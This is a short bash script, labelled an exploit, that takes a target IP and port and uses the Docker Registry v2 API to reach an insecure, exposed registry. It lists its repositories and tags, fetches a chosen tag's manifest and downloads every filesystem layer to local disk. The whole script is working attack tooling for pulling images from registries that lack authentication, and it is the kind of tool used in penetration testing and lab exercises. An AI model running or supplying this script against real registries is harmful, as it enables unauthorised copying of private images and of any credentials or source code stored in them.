#!/bin/bash

# Exploit a insecure exposed running Docker Registry
# This script is not for a specific attacks, rather 
# it can be used to explore the Docker Registry, i.e.,
# listing all repositories, listing all tags for a 
# specific repo, and inspecting a specific tag.

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
YELLOW='\033[1;33m'

function check_command_output {
	if [ ! $? -eq 0 ]; then
		echo -e "[*] ${RED}Error. Exiting ...${NC}"
		exit 1
	fi;
}

get_input() {
	echo -e "[*] ${GREEN}" $1 "${NC}"
	read ans

	while [ -z ${ans} ]
	do
		echo -e "[*] ${GREEN}" $1 "${NC}"
		read ans
	done;
}

rip=$1
rport=$2

if [[ -z ${rip} || -z ${rport} ]]; then
	echo -e "Usage: exploit_registry.sh {ip} {port}"
	exit 1
fi;

urlpref=http
if [[ ${rport} == 443 ]]; then
	urlpref=https
fi;

echo -e "[*] ${GREEN}Check if ${rip}:${rport} is reachable${NC}"
curl -XGET ${urlpref}://${rip}:${rport}/v2 > /dev/null
check_command_output

echo -e "[*] ${GREEN}The host is reachable${NC}"
echo -e "[*] ${GREEN}Listing all repositories${NC}"
repos=$(curl -XGET ${urlpref}://${rip}:${rport}/v2/_catalog 2> /dev/null | jq '.repositories | .[]')
check_command_output

on="yes"

while [ ! -z ${on} ];
do
	echo -e "${GREEN}" ${repos}"${NC}"
	get_input "Select one repository"
	repo=${ans}

	echo -e "[*] ${GREEN}Listing all tags for repo" ${repo} "${NC}"
	curl -XGET ${urlpref}://${rip}:${rport}/v2/${repo}/tags/list 2> /dev/null | jq '.tags | .[]'
	check_command_output

	get_input "Select one tag"
	tag=${ans}
	
	echo -e "[*] ${GREEN}Getting manifest for tag" ${tag} "${NC}"
	result=$(curl -XGET ${urlpref}://${rip}:${rport}/v2/${repo}/manifests/${tag})
	check_command_output
	statuscode=$(echo ${result} | cut -d$' ' -f1)
	if [[ ${statuscode} == 404 ]]; then
		echo -e "[*] ${YELLOW}Manifest for repo" ${repo} "with tag" ${tag} "does not exists${NC}"
	else
		echo -e "[*] ${GREEN}Listing all SHA digest of Image Filesystem Layers${NC}"
		layers=`echo ${result} | jq '.fsLayers[] | .blobSum'`
		echo -e "${GREEN}${layers}${NC}"
		check_command_output

		get_input "Choose a destination directory"
		dir=${ans}

		if [ ! -d ${dir} ]; then
			mkdir -p ${dir}
		fi;
		
		declare -i idx=0
		for digest in ${layers}; do	
			f=${dir}/${repo}.${tag}.${idx}.tar
			echo -e "[*] ${GREEN}Saving fslayer for "${digest}" in "${f}"${NC}"
			curl -XGET ${urlpref}://${rip}:${rport}/v2/${repo}/blobs/${digest:1:-1} --output ${f} > /dev/null
			idx=$(( idx + 1 ))
		done;
	fi;

	echo -e "[*] ${GREEN}Do u like to continue (leave blank to exit)?${NC}"
	read on
done;

echo -e "[*] ${GREEN}Exiting ...${NC}"
exit 0
